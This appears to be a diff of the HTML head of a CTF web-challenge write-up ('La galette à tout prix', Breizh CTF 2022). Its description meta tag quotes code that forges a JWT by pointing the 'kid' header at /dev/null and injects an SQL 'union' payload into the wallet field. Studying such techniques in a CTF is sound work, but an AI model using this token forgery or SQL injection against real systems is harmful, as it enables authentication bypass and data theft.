@@ -3,7 +3,7 @@
   <head>
     <title>[Breizh CTF 2022 - web] La galette à tout prix // ret2school</title>
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.81.0" />
+    <meta name="generator" content="Hugo 0.80.0" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="author" content="nasm" />
     <meta name="description" content="" />
@@ -34,10 +34,9 @@ import jwt FILENAME = &quot;/dev/null&quot; key = open(FILENAME).read(32) jwt.en
 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiciLCJ3YWxsZXQiOltdLCJraWQiOiIuL3NlY3JldC5rZXkifQ.sPF55gkdqUQqAfkeBFtQRWOZgh_4S2jaIEJz2FcUsp8 header : {&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;} payload : {&quot;username&quot;:&quot;&#39;&quot;,&quot;wallet&quot;:[],&quot;kid&quot;:&quot;./secret.key&quot;} If we edit kid with a file that we already know the content (such as /dev/null) we can sign any JWT.
 import jwt FILENAME = &quot;/dev/null&quot; key = open(FILENAME).read(32) jwt.encode({&quot;username&quot;:&quot;Monsieur Rennes Whisky&quot;,&quot;wallet&quot;:[f&quot;2 union {sql}&quot;],&quot;kid&quot;:FILENAME}, key=key, algorithm=&quot;HS256&quot;) # it provides us a valid JWT :) We then discover that there is an SQL injection with wallet." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://ret2school.github.io/post/galette/" /><meta property="article:section" content="post" />
-<meta property="article:published_time" content="2022-04-05T00:00:00&#43;00:00" />
-<meta property="article:modified_time" content="2022-04-05T00:00:00&#43;00:00" />
-
+<meta property="og:url" content="https://ret2school.github.io/post/galette/" />
+<meta property="article:published_time" content="2022-04-05T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-04-05T00:00:00+00:00" />
 
 
   </head>
